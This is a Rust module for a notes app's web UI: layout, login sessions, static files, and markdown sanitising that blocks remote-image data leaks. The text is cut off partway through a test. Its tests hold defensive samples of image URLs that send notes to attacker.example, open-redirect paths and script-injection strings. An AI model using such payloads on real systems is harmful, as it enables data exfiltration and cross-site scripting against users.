//! The server-rendered web UI.
//!
//! Pages are rendered with maud and enhanced with htmx: forms post to the
//! server, which answers with an HTML fragment (or a redirect) instead of
//! JSON. Every page calls the same [`crate::services`] functions the JSON API
//! uses, so the two can never disagree about behaviour.
//!
//! This module holds the shared pieces: the page layout, static assets, the
//! login page, markdown rendering and error pages. Feature pages live in the
//! submodules.

use axum::extract::{Path, Query, State};
use axum::http::{header, HeaderMap, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Redirect, Response};
use axum::routing::get;
use axum::{Form, Router};
use include_dir::{include_dir, Dir};
use maud::{html, Markup, PreEscaped, DOCTYPE};
use serde::Deserialize;

use crate::api::auth;
use crate::error::AppError;
use crate::services::login_sessions;
use crate::state::AppState;

mod helpers;
pub use helpers::*;

pub mod discover;
pub mod notebooks;
pub mod podcasts;
pub mod search;
pub mod settings;
pub mod sources;
pub mod studio;
pub mod workspace;

static STATIC: Dir<'static> = include_dir!("$CARGO_MANIFEST_DIR/static");

/// Feature areas. Each has `src/web/<area>.rs`, `static/css/<area>.css` and
/// `static/js/<area>.js`; every page loads all of them.
const AREAS: [&str; 8] = ["notebooks", "studio", "sources", "search", "podcasts", "settings", "discover", "workspace"];

pub fn router() -> Router<AppState> {
    Router::new()
        .route("/", get(|| async { Redirect::to("/notes") }))
        .route("/static/{*path}", get(static_file))
        .route("/login", get(login_page).post(login_submit))
        // POST only: a link or an <img> on another site must not sign you out.
        .route("/logout", axum::routing::post(logout))
        .merge(notebooks::router())
        .merge(studio::router())
        .merge(sources::router())
        .merge(search::router())
        .merge(podcasts::router())
        .merge(settings::router())
        .merge(discover::router())
        .merge(workspace::router())
        .fallback(not_found_page)
}

// ---------------------------------------------------------------------------
// Layout
// ---------------------------------------------------------------------------

/// One entry of the sidebar.
pub(crate) struct NavItem {
    pub(crate) label: &'static str,
    pub(crate) href: &'static str,
    pub(crate) colour: &'static str,
}

/// The sidebar, grouped as in the Next.js frontend: collect, process, create, manage.
/// The Notes view lists the same pages under "Studio".
pub(crate) const NAVIGATION: [(&str, &[NavItem]); 3] = [
    (
        "Process",
        &[
            NavItem { label: "Notebooks", href: "/notebooks", colour: "var(--teal)" },
            NavItem { label: "Ask and Search", href: "/search", colour: "var(--gold)" },
        ],
    ),
    ("Create", &[NavItem { label: "Podcasts", href: "/podcasts", colour: "var(--mauve)" }]),
    (
        "Manage",
        &[
            NavItem { label: "Sources", href: "/sources", colour: "var(--sage)" },
            NavItem { label: "Models", href: "/settings/models", colour: "var(--plum)" },
            NavItem { label: "Transformations", href: "/transformations", colour: "var(--fern)" },
            NavItem { label: "Settings", href: "/settings", colour: "var(--ink-faint)" },
            NavItem { label: "Advanced", href: "/advanced", colour: "var(--ink-faint)" },
        ],
    ),
];

/// The nav item to highlight: the longest href that prefixes the path, so
/// `/settings/models` highlights Models and not Settings.
fn active_href(path: &str) -> Option<&'static str> {
    NAVIGATION
        .iter()
        .flat_map(|(_, items)| items.iter())
        .map(|item| item.href)
        .filter(|href| path == *href || path.starts_with(&format!("{href}/")))
        .max_by_key(|href| href.len())
}

/// Context every page needs to render its chrome.
#[derive(Debug, Clone, Default)]
pub struct PageContext {
    /// Path of the current page, for highlighting the nav.
    pub path: String,
    /// Whether a password is configured (shows the sign-out button).
    pub auth_enabled: bool,
}

impl PageContext {
    pub fn new(state: &AppState, path: impl Into<String>) -> Self {
        Self { path: path.into(), auth_enabled: state.config.password.is_some() }
    }
}

/// Restores the collapsed sidebar before first paint, so it cannot flash open.
const SIDEBAR_INIT: &str = r#"try{if(localStorage.getItem("nn-sidebar-collapsed")==="true"){document.documentElement.classList.add("sidebar-collapsed");}}catch(error){}"#;

/// Every inline `<script>` the pages render. They run before first paint (one
/// uses `document.currentScript`), so they stay inline; the page CSP allows
/// exactly these by hash, computed from these same strings so it cannot drift.
pub(crate) const INLINE_SCRIPTS: [&str; 3] = [SIDEBAR_INIT, workspace::FOCUS_INIT, notebooks::COLUMNS_INIT];

pub(crate) fn head(title: &str) -> Markup {
    html! {
        meta charset="utf-8";
        meta name="viewport" content="width=device-width, initial-scale=1";
        meta name="color-scheme" content="light dark";
        title { (title) " · Nova Notes" }
        script { (PreEscaped(SIDEBAR_INIT)) }
        link rel="stylesheet" href=(asset_url("app.css"));
        @for area in AREAS {
            link rel="stylesheet" href=(asset_url(&format!("css/{area}.css")));
        }
        script src=(asset_url("vendor/htmx.min.js")) defer {}
        script src=(asset_url("app.js")) defer {}
        @for area in AREAS {
            script src=(asset_url(&format!("js/{area}.js"))) defer {}
        }
    }
}

/// A full page: sidebar, main column, toast area.
pub fn page(ctx: &PageContext, title: &str, body: Markup) -> Markup {
    let active = active_href(&ctx.path);
    html! {
        (DOCTYPE)
        html lang="en" {
            head { (head(title)) }
            body hx-headers=r#"{"X-Requested-With": "htmx"}"# {
                div.shell {
                    nav.sidebar id="site-sidebar" aria-label="Main" {
                        div.sidebar-header {
                            a.brand href="/notebooks" {
                                span.pebbles aria-hidden="true" { i {} i {} i {} }
                                "Nova Notes"
                            }
                            button.btn.btn-ghost.btn-icon.sidebar-toggle type="button" data-sidebar-toggle
                                aria-controls="sidebar-links" aria-expanded="true" aria-label="Collapse sidebar" title="Collapse sidebar" {
                                (PreEscaped(r#"<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.3" aria-hidden="true"><rect x="1.5" y="2.5" width="13" height="11" rx="2"/><path d="M6 2.5v11"/></svg>"#))
                            }
                        }
                        // Studio pages sit beside the Notes view; this is the way back.
                        a.btn.back-to-notes href="/notes" title="Back to Notes" aria-label="Back to Notes" {
                            span aria-hidden="true" { "‹" } span.back-to-notes-label { "Notes" }
                        }
                        div.sidebar-links id="sidebar-links" {
                            div.nav-group {
                                div.nav-title { "Collect" }
                                form method="post" action="/notes/quick" data-note-create {
                                    button.nav-link.nav-action type="submit" {
                                        span.dot.quick-note-dot aria-hidden="true" { "+" }
                                        "Quick Note"
                                    }
                                }
                            }
                            @for (group, items) in NAVIGATION {
                                div.nav-group {
                                    div.nav-title { (group) }
                                    @for item in items {
                                        a.nav-link href=(item.href) aria-current=[(active == Some(item.href)).then_some("page")] {
                                            span.dot style=(format!("background:{}", item.colour)) {}
                                            (item.label)
                                        }
                                    }
                                }
                            }
                            div.sidebar-foot {
                                button.btn.btn-ghost.btn-sm type="button" data-theme-toggle { "Toggle theme" }
                                @if ctx.auth_enabled {
                                    form method="post" action="/logout" {
                                        button.btn.btn-ghost.btn-sm type="submit" { "Sign out" }
                                    }
                                }
                                span { "v" (crate::VERSION) }
                            }
                        }
                    }
                    main.main id="main" { (body) }
                }
                button.btn.menu-toggle type="button" data-menu-toggle aria-controls="site-sidebar" aria-expanded="false" { "Menu" }
                a.btn.notes-fab href="/notes" { "‹ Notes" }
                div id="toasts" aria-live="polite" {}
            }
        }
    }
}

/// A page heading with an optional subtitle and actions on the right.
pub fn page_head(title: &str, subtitle: Option<&str>, actions: Markup) -> Markup {
    html! {
        div.page-head {
            div {
                h1 { (title) }
                @if let Some(subtitle) = subtitle { p { (subtitle) } }
            }
            div.row { (actions) }
        }
    }
}

/// An empty-state box.
pub fn empty_state(title: &str, hint: &str) -> Markup {
    html! { div.empty { strong { (title) } (hint) } }
}

/// A status badge for a background job status (`new`, `running`, `completed`, ...).
pub fn status_badge(status: Option<&str>) -> Markup {
    let (class, label) = match status.unwrap_or("") {
        "completed" => ("ok", "Ready"),
        "running" => ("info", "Processing"),
        "new" | "queued" | "pending" => ("info", "Queued"),
        "failed" | "error" => ("bad", "Failed"),
        "canceled" | "cancelled" => ("warn", "Canceled"),
        "" => return html! {},
        other => ("", other),
    };
    html! { span class=(format!("badge {class}")) { (label) } }
}

/// A short, human date ("13 Nov 2026, 19:24") from an optional timestamp.
pub fn human_date(value: Option<chrono::DateTime<chrono::Utc>>) -> String {
    value.map(|d| d.format("%-d %b %Y, %H:%M").to_string()).unwrap_or_default()
}

// ---------------------------------------------------------------------------
// Markdown
// ---------------------------------------------------------------------------

/// Whether an image URL stays on this server: a same-origin path or a
/// `data:image/` URL. Anything else would make the browser fetch a remote URL
/// as soon as the text renders, which leaks whatever a prompt injection put in
/// the URL. Browsers drop tabs and newlines inside URLs, trim leading spaces
/// and read `\` as `/`, so those make `/\t/evil.example` remote and are refused.
pub(crate) fn is_local_image_src(src: &str) -> bool {
    if src.chars().any(|c| matches!(c, '\t' | '\n' | '\r' | '\\')) {
        return false;
    }
    let src = src.trim_start_matches(|c: char| c <= ' ');
    if src.get(..11).is_some_and(|head| head.eq_ignore_ascii_case("data:image/")) {
        return true;
    }
    if src.starts_with("//") {
        return false;
    }
    // A scheme (`https:`, `blob:`, `javascript:`) before the first `/`, `?` or `#`.
    !src.split(['/', '?', '#']).next().unwrap_or("").contains(':')
}

/// Markdown images that point off this server become plain links: the reader
/// can still follow one, but nothing is fetched without a click.
fn remote_images_to_links<'a>(parser: impl Iterator<Item = pulldown_cmark::Event<'a>>) -> Vec<pulldown_cmark::Event<'a>> {
    use pulldown_cmark::{CowStr, Event, Tag, TagEnd};
    // One entry per open image: (turned into a link, its URL, text seen inside).
    let mut open: Vec<(bool, CowStr<'a>, bool)> = Vec::new();
    let mut out = Vec::new();
    for event in parser {
        match event {
            Event::Start(Tag::Image { link_type, dest_url, title, id }) => {
                let remote = !is_local_image_src(&dest_url);
                open.push((remote, dest_url.clone(), false));
                out.push(Event::Start(if remote {
                    Tag::Link { link_type, dest_url, title, id }
                } else {
                    Tag::Image { link_type, dest_url, title, id }
                }));
            }
            Event::End(TagEnd::Image) => match open.pop() {
                Some((true, url, saw_text)) => {
                    if !saw_text {
                        out.push(Event::Text(url));
                    }
                    out.push(Event::End(TagEnd::Link));
                }
                _ => out.push(Event::End(TagEnd::Image)),
            },
            Event::Text(ref text) | Event::Code(ref text) => {
                if !text.trim().is_empty() {
                    if let Some(top) = open.last_mut() {
                        top.2 = true;
                    }
                }
                out.push(event);
            }
            other => out.push(other),
        }
    }
    out
}

/// Render untrusted markdown (model output, user notes, extracted web pages)
/// to sanitised HTML. Images load only from this server or `data:` URLs.
pub fn markdown(text: &str) -> Markup {
    use pulldown_cmark::{html::push_html, Options, Parser};
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    options.insert(Options::ENABLE_TASKLISTS);
    let mut raw = String::with_capacity(text.len() * 3 / 2);
    push_html(&mut raw, remote_images_to_links(Parser::new_ext(text, options)).into_iter());
    let clean = ammonia::Builder::default()
        .link_rel(Some("noopener noreferrer nofollow"))
        .add_generic_attributes(["align"])
        // `data:` is for inline images only; the filter drops it everywhere else.
        .add_url_schemes(["data"])
        .attribute_filter(|element, attribute, value| {
            const URL_ATTRIBUTES: [&str; 6] = ["href", "src", "cite", "longdesc", "srcset", "poster"];
            if element == "img" && attribute == "src" {
                return is_local_image_src(value).then_some(value.into());
            }
            let is_data = value.trim_start().get(..5).is_some_and(|head| head.eq_ignore_ascii_case("data:"));
            if URL_ATTRIBUTES.contains(&attribute) && is_data {
                return None;
            }
            Some(value.into())
        })
        .clean(&raw)
        .to_string();
    html! { div.prose { (PreEscaped(clean)) } }
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Whether the request came from htmx (and so wants a fragment, not a page).
pub fn is_htmx(headers: &HeaderMap) -> bool {
    headers.contains_key("hx-request")
}

/// An [`AppError`] rendered as HTML. Handlers in the web UI return
/// `Result<_, WebError>`; `?` converts any `AppError`.
#[derive(Debug)]
pub struct WebError(pub AppError);

impl From<AppError> for WebError {
    fn from(e: AppError) -> Self {
        Self(e)
    }
}

pub type WebResult<T> = Result<T, WebError>;

impl IntoResponse for WebError {
    fn into_response(self) -> Response {
        let status = self.0.status();
        // `detail()` logs a 500 itself (and shows a generic message).
        if status.is_server_error() && status != StatusCode::INTERNAL_SERVER_ERROR {
            tracing::error!(%status, "{}", self.0);
        }
        // The client script reads `data-error-detail` for its toast, so the
        // same body serves both a full page load and an htmx swap.
        let body = html! {
            (DOCTYPE)
            html lang="en" {
                head { (head("Error")) }
                body {
                    div.center-page {
                        div.card.stack {
                            h2 { (status.canonical_reason().unwrap_or("Error")) }
                            p.muted data-error-detail { (self.0.detail()) }
                            div.row { a.btn href="/notebooks" { "Back to notebooks" } }
                        }
                    }
                }
            }
        };
        (status, body).into_response()
    }
}

async fn not_found_page() -> Response {
    WebError(AppError::not_found("There is no page at this address.")).into_response()
}

// ---------------------------------------------------------------------------
// Static files
// ---------------------------------------------------------------------------

/// URL of an embedded static file, with a suffix that changes whenever the
/// file's contents do, so browsers pick up a new build at once rather than
/// keeping the cached copy for a day.
pub fn asset_url(path: &str) -> String {
    use std::hash::{Hash, Hasher};
    let Some(file) = STATIC.get_file(path) else {
        return format!("/static/{path}?v={}", crate::VERSION);
    };
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    file.contents().hash(&mut hasher);
    format!("/static/{path}?v={:016x}", hasher.finish())
}

async fn static_file(Path(path): Path<String>) -> Response {
    let Some(file) = STATIC.get_file(&path) else {
        return (StatusCode::NOT_FOUND, "Not found").into_response();
    };
    let mime = mime_guess::from_path(&path).first_or_octet_stream();
    (
        [
            (header::CONTENT_TYPE, HeaderValue::from_str(mime.as_ref()).unwrap_or(HeaderValue::from_static("application/octet-stream"))),
            (header::CACHE_CONTROL, HeaderValue::from_static("public, max-age=86400")),
            (header::X_CONTENT_TYPE_OPTIONS, HeaderValue::from_static("nosniff")),
        ],
        file.contents(),
    )
        .into_response()
}

// ---------------------------------------------------------------------------
// Login
// ---------------------------------------------------------------------------

#[derive(Debug, Default, Deserialize)]
struct LoginQuery {
    next: Option<String>,
    error: Option<String>,
}

/// Only same-site relative paths are followed after login.
fn safe_next(next: Option<&str>) -> String {
    safe_path_or(next, "/notebooks")
}

fn login_form(next: &str, error: Option<&str>) -> Markup {
    html! {
        (DOCTYPE)
        html lang="en" {
            head { (head("Sign in")) }
            body {
                div.center-page {
                    form.card.stack method="post" action="/login" {
                        div.row {
                            span.pebbles aria-hidden="true" { i {} i {} i {} }
                            h2 { "Nova Notes" }
                        }
                        @if let Some(error) = error { div.flash.bad role="alert" { (error) } }
                        input type="hidden" name="next" value=(next);
                        div.field {
                            label for="password" { "Password" }
                            input #password type="password" name="password" autocomplete="current-password" required autofocus;
                        }
                        button.btn.btn-primary type="submit" { "Sign in" }
                    }
                }
            }
        }
    }
}

async fn login_page(State(state): State<AppState>, Query(query): Query<LoginQuery>) -> Response {
    let next = safe_next(query.next.as_deref());
    if state.config.password.is_none() {
        return Redirect::to(&next).into_response();
    }
    let error = query.error.as_deref().map(|_| "That password is not right.");
    login_form(&next, error).into_response()
}

#[derive(Debug, Deserialize)]
struct LoginForm {
    password: String,
    next: Option<String>,
}

fn session_cookie(name: &str, value: &str, max_age: i64, secure: bool) -> HeaderValue {
    let secure = if secure { "; Secure" } else { "" };
    HeaderValue::from_str(&format!("{name}={value}; Path=/; HttpOnly; SameSite=Lax; Max-Age={max_age}{secure}"))
        .expect("cookie value is ASCII")
}

/// The session cookie's name: `__Host-` prefixed over HTTPS (it must be
/// `Secure`), the plain name on HTTP localhost where `Secure` cannot be set.
fn session_cookie_name(https: bool) -> &'static str {
    if https {
        auth::SECURE_SESSION_COOKIE
    } else {
        auth::SESSION_COOKIE
    }
}

/// Whether the browser reached us over HTTPS, so the cookie can be `Secure`
/// (it must still work on plain-HTTP localhost). Forwarded headers count only
/// behind a trusted proxy; see [`crate::api::perimeter::request_origin`].
fn is_https(state: &AppState, headers: &HeaderMap) -> bool {
    crate::api::perimeter::request_origin(&state.config, headers).https
}

async fn login_submit(
    State(state): State<AppState>,
    headers: HeaderMap,
    extensions: axum::http::Extensions,
    Form(form): Form<LoginForm>,
) -> Response {
    let next = safe_next(form.next.as_deref());
    let Some(password) = state.config.password.as_deref() else {
        return Redirect::to(&next).into_response();
    };
    let client = auth::client_ip(&state.config, &headers, &extensions);
    if let Err(wait) = state.login_throttle.check(client) {
        let seconds = wait.as_secs() + u64::from(wait.subsec_nanos() > 0);
        let mut response = (StatusCode::TOO_MANY_REQUESTS, login_form(&next, Some(&auth::throttled_detail(wait)))).into_response();
        response.headers_mut().insert(header::RETRY_AFTER, HeaderValue::from(seconds.max(1)));
        return response;
    }
    if !auth::constant_time_eq(form.password.as_bytes(), password.as_bytes()) {
        tracing::warn!("Failed sign-in attempt from {client}");
        state.login_throttle.record_failure(client);
        let target = format!("/login?error=1&next={}", auth::encode_query_value(&next));
        return Redirect::to(&target).into_response();
    }
    state.login_throttle.record_success(client);
    let session = match login_sessions::create(&state, password).await {
        Ok(session) => session,
        Err(e) => return WebError(e).into_response(),
    };
    let https = is_https(&state, &headers);
    let name = session_cookie_name(https);
    let mut response = Redirect::to(&next).into_response();
    response
        .headers_mut()
        .append(header::SET_COOKIE, session_cookie(name, &session, login_sessions::LIFETIME_SECONDS, https));
    if https {
        // Retire a cookie from before the `__Host-` name.
        response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SESSION_COOKIE, "", 0, true));
    }
    response
}

/// Sign out: end the session on the server and clear the cookie.
async fn logout(State(state): State<AppState>, headers: HeaderMap) -> Response {
    for id in auth::session_ids(&headers) {
        if let Err(e) = login_sessions::revoke(&state, id).await {
            return WebError(e).into_response();
        }
    }
    let https = is_https(&state, &headers);
    let mut response = Redirect::to("/login").into_response();
    response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SESSION_COOKIE, "", 0, https));
    if https {
        response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SECURE_SESSION_COOKIE, "", 0, true));
    }
    response
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::{Method, Request};

    use crate::testing::TestApp;

    #[test]
    fn nav_highlights_the_most_specific_item() {
        assert_eq!(active_href("/settings/models"), Some("/settings/models"));
        assert_eq!(active_href("/settings"), Some("/settings"));
        assert_eq!(active_href("/notebooks/notebook:abc"), Some("/notebooks"));
        assert_eq!(active_href("/notes"), None);
        assert_eq!(active_href("/sourcesx"), None);
    }

    #[test]
    fn next_paths_stay_on_this_site() {
        assert_eq!(safe_next(Some("/notebooks/x")), "/notebooks/x");
        assert_eq!(safe_next(Some("//evil.example")), "/notebooks");
        assert_eq!(safe_next(Some("https://evil.example")), "/notebooks");
        assert_eq!(safe_next(Some("/\\evil.example")), "/notebooks");
        assert_eq!(safe_next(None), "/notebooks");
    }

    #[test]
    fn markdown_is_sanitised() {
        let out = markdown("# Title\n\n<script>alert(1)</script>\n\n[x](javascript:alert(1)) **bold**\n\n| a | b |\n|---|---|\n| 1 | 2 |").into_string();
        assert!(out.contains("<h1>Title</h1>"), "{out}");
        assert!(out.contains("<strong>bold</strong>"));
        assert!(out.contains("<table>"));
        assert!(!out.contains("<script"), "{out}");
        assert!(!out.contains("javascript:"), "{out}");
    }

    #[test]
    fn remote_images_render_as_links() {
        let out = markdown(
            "![secret](https://attacker.example/p?d=notes)\n\n![](//attacker.example/x.png)\n\n\
             <img src=\"https://attacker.example/raw.png\"> <img src=\"/\\attacker.example/a.png\"> \
             <img src=\"/\t/attacker.example/b.png\"> <img src=\"blob:https://x/1\">",
        )
        .into_string();
        assert!(!out.contains("<img src=\"https:"), "{out}");
        assert!(!out.contains("src=\"//"), "{out}");
        assert!(!out.contains("attacker.example/raw.png"), "{out}");
        assert!(!out.contains("src=\"/\\"), "{out}");
        assert!(!out.contains("src=\"blob:"), "{out}");
        // Markdown images become links the reader can still follow.
        assert!(out.contains("<a href=\"https://attacker.example/p?d=notes\" rel=\"noopener noreferrer nofollow\">secret</a>"), "{out}");
        assert!(out.contains(">//attacker.example/x.png</a>"), "{out}");
    }

    #[test]
    fn local_and_data_images_still_render() {
        let out = markdown("![pic](/note-blobs/abc123)\n\n![rel](images/a.png)\n\n![dot](data:image/png;base64,iVBORw0KGgo=)").into_string();
        assert!(out.contains("<img src=\"/note-blobs/abc123\" alt=\"pic\">"), "{out}");
        assert!(out.contains("<img src=\"images/a.png\""), "{out}");
        assert!(out.contains("<img src=\"data:image/png;base64,iVBORw0KGgo=\""), "{out}");
        // data: is for images only.
        let out = markdown("[x](data:text/html;base64,PHNjcmlwdD4=) <a href=\"data:text/html,hi\">y</a>").into_string();
        assert!(!out.contains("data:"), "{out}");
        for (src, local) in [
            ("/note-blobs/x", true),
            ("a/b.png", true),
            ("?x=1", true),
            ("DATA:image/png;base64,AA", true),
            ("https://x.example/a.png", false),
            ("HTTP://x.example", false),
            ("//x.example/a", false),
            (" //x.example/a", false),
            ("/\\x.example/a", false),
            ("/\t/x.example", false),
            ("data:text/html,x", false),
            ("javascript:alert(1)", false),
        ] {
            assert_eq!(is_local_image_src(src), local, "{src:?}");
        }
    }

    #[tokio::test]
    async fn static_assets_are_served() {
        let app = TestApp::new().await;
        for (path, mime) in [("/static/app.css", "text/css"), ("/static/app.js", "javascript"), ("/static/vendor/htmx.min.js", "javascript")] {
            let response = app.send(Request::builder().uri(path).body(Body::empty()).unwrap()).await;
            assert_eq!(response.status(), StatusCode::OK, "{path}");
            assert!(response.headers()[header::CONTENT_TYPE].to_str().unwrap().contains(mime), "{path}");
        }
        let (status, _) = app.text(Method::GET, "/static/nope.css", None).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn error_pages_hide_internal_text() {
        let response = WebError(AppError::database("Parse error near SELECT * FROM credential at /srv/data")).into_response();
        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
        let body = String::from_utf8(
            http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        assert!(!body.contains("credential") && !body.contains("/srv/data"), "{body}");
        assert!(body.contains(crate::error::INTERNAL_DETAIL), "{body}");
    }

    #[tokio::test]
    async fn unknown_pages_render_an_html_404() {
        let app = TestApp::new().await;
        let (status, body) = app.text(Method::GET, "/no/such/page", None).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        assert!(body.contains("data-error-detail"), "{body}");
        // The JSON API keeps its JSON 404.
        let (status, body) = app.get("/api/no/such/route").await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        assert_eq!(body["detail"], "Not Found");
    }

    #[tokio::test]
    async fn login_sets_a_session_cookie_that_opens_the_app() {
        let mut app = TestApp::new().await;
        let mut config = (*app.state.config).clone();
        config.password = Some("hunter2".into());
        // Behind Tailscale Serve or another proxy that sets X-Forwarded-Proto.
        config.trust_proxy_headers = true;
        app.state.config = std::sync::Arc::new(config);
        app.router = crate::api::build_router(app.state.clone());

        // Without a session, pages redirect to the login form.
        let response = app.send(Request::builder().uri("/notebooks").body(Body::empty()).unwrap()).await;
        assert_eq!(response.status(), StatusCode::SEE_OTHER);
        let (status, body) = app.text(Method::GET, "/login?next=/notebooks", None).await;
        assert_eq!(status, StatusCode::OK);
        assert!(body.contains("name=\"password\""));

        let form = |password: &str| {
            Request::builder()
                .method(Method::POST)
                .uri("/login")
                .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
                .body(Body::from(format!("password={password}&next=%2Fsources")))
                .unwrap()
        };
        let wrong = app.send(form("nope")).await;
        assert_eq!(wrong.status(), StatusCode::SEE_OTHER);
        assert!(wrong.headers()[header::LOCATION].to_str().unwrap().starts_with("/login?error=1"));
        assert!(wrong.headers().get(header::SET_COOKIE).is_none());

        let right = app.send(form("hunter2")).await;
        assert_eq!(right.status(), StatusCode::SEE_OTHER);
        assert_eq!(right.headers()[header::LOCATION], "/sources");
        let cookie = right.headers()[header::SET_COOKIE].to_str().unwrap().to_string();
        assert!(cookie.contains("HttpOnly") && cookie.contains("SameSite=Lax") && !cookie.contains("Secure"), "{cookie}");
        let pair = cookie.split(';').next().unwrap().to_string();

        let (status, _) = {
            let response = app
                .send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, &pair).body(Body::empty()).unwrap())
                .await;
            (response.status(), ())
        };
        assert_eq!(status, StatusCode::OK);

        let out = app.send(Request::builder().method(Method::POST).uri("/logout").body(Body::empty()).unwrap()).await;
        assert!(out.headers()[header::SET_COOKIE].to_str().unwrap().contains("Max-Age=0"));
        // A link or an image on another page cannot sign you out.
        let get_out = app.send(Request::builder().uri("/logout").body(Body::empty()).unwrap()).await;
        assert_eq!(get_out.status(), StatusCode::METHOD_NOT_ALLOWED);
        assert!(get_out.headers().get(header::SET_COOKIE).is_none());

        // Over HTTPS the cookie takes the `__Host-` name, and the old name is retired.
        let mut secure = form("hunter2");
        secure.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
        let right = app.send(secure).await;
        let cookies: Vec<String> =
            right.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap().to_string()).collect();
        let host_cookie = cookies.iter().find(|c| c.starts_with("__Host-nn_session=")).expect("__Host- cookie");
        assert!(host_cookie.contains("; Secure") && host_cookie.contains("Path=/") && !host_cookie.contains("Domain"), "{host_cookie}");
        assert!(cookies.iter().any(|c| c.starts_with("nn_session=;") && c.contains("Max-Age=0")), "{cookies:?}");
        let pair = host_cookie.split(';').next().unwrap().to_string();
        let response =
            app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, &pair).body(Body::empty()).unwrap()).await;
        assert_eq!(response.status(), StatusCode::OK);
        // The old password-derived cookie no longer opens anything.
        let legacy = {
            use sha2::{Digest, Sha256};
            format!("nn_session={}", hex::encode(Sha256::digest(b"nova-notes-session-v1:hunter2")))
        };
        let response =
            app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, &legacy).body(Body::empty()).unwrap()).await;
        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
        let mut secure_out = Request::builder().method(Method::POST).uri("/logout").body(Body::empty()).unwrap();
        secure_out.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
        let out = app.send(secure_out).await;
        let cleared: Vec<&str> = out.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap()).collect();
        assert!(cleared.iter().any(|c| c.starts_with("__Host-nn_session=;") && c.contains("Max-Age=0") && c.contains("Secure")), "{cleared:?}");
        assert!(cleared.iter().any(|c| c.starts_with("nn_session=;") && c.contains("Max-Age=0")), "{cleared:?}");
    }

    async fn with_password(password: &str) -> TestApp {
        let mut app = TestApp::new().await;
        let mut config = (*app.state.config).clone();
        config.password = Some(password.into());
        app.state.config = std::sync::Arc::new(config);
        app.router = crate::api::build_router(app.state.clone());
        app
    }

    fn sign_in(password: &str, ip: &str) -> Request<Body> {
        let mut request = Request::builder()
            .method(Method::POST)
            .uri("/login")
            .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(Body::from(format!("password={password}&next=%2Fnotebooks")))
            .unwrap();
        let addr: std::net::SocketAddr = format!("{ip}:40000").parse().unwrap();
        request.extensions_mut().insert(axum::extract::ConnectInfo(addr));
        request
    }

    /// The `name=value` pair of the session cookie a sign-in set.
    fn session_pair(response: &Response) -> String {
        let cookie = response.headers()[header::SET_COOKIE].to_str().unwrap();
        cookie.split(';').next().unwrap().to_string()
    }

    async fn status_with_cookie(app: &TestApp, cookie: &str) -> StatusCode {
        app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, cookie).body(Body::empty()).unwrap())
            .await
            .status()
    }

    #[tokio::test]
    async fn each_sign_in_gets_its_own_session_and_sign_out_ends_it() {
        let app = with_password("hunter2").await;
        let first = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
        let second = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
        assert_ne!(first, second);
        assert!(!first.contains("hunter2"));
        assert_eq!(status_with_cookie(&app, &first).await, StatusCode::OK);
        assert_eq!(status_with_cookie(&app, &second).await, StatusCode::OK);

        let out = app
            .send(Request::builder().method(Method::POST).uri("/logout").header(header::COOKIE, &first).body(Body::empty()).unwrap())
            .await;
        assert_eq!(out.status(), StatusCode::SEE_OTHER);
        // A replayed copy of the signed-out cookie is refused by the server.
        assert_eq!(status_with_cookie(&app, &first).await, StatusCode::UNAUTHORIZED);
        assert_eq!(status_with_cookie(&app, &second).await, StatusCode::OK);
    }

    #[tokio::test]
    async fn a_new_password_ends_existing_sessions() {
        let mut app = with_password("hunter2").await;
        let cookie = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
        assert_eq!(status_with_cookie(&app, &cookie).await, StatusCode::OK);

        // Restart with a different OPEN_NOTEBOOK_PASSWORD on the same database.
        let mut config = (*app.state.config).clone();
        config.password = Some("correct horse".into());
        app.state.config = std::sync::Arc::new(config);
        app.router = crate::api::build_router(app.state.clone());
        assert_eq!(status_with_cookie(&app, &cookie).await, StatusCode::UNAUTHORIZED);
        let fresh = session_pair(&app.send(sign_in("correct%20horse", "192.0.2.1")).await);
        assert_eq!(status_with_cookie(&app, &fresh).await, StatusCode::OK);
    }

    /// Without a trusted proxy, `X-Forwarded-Proto` does not decide the
    /// cookie; an https public URL for the requested host does.
    #[tokio::test]
    async fn the_secure_flag_follows_the_trust_rule() {
        let mut app = with_password("hunter2").await;
        let mut request = sign_in("hunter2", "192.0.2.1");
        request.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
        let cookie = app.send(request).await.headers()[header::SET_COOKIE].to_str().unwrap().to_string();
        assert!(cookie.starts_with("nn_session=") && !cookie.contains("Secure"), "{cookie}");

        let mut config = (*app.state.config).clone();
        config.allowed_hosts.push("notes.example.ts.net".into());
        config.public_origins.push("https://notes.example.ts.net".into());
        app.state.config = std::sync::Arc::new(config);
        app.router = crate::api::build_router(app.state.clone());
        let mut request = sign_in("hunter2", "192.0.2.1");
        request.headers_mut().insert(header::HOST, HeaderValue::from_static("notes.example.ts.net"));
        let response = app.send(request).await;
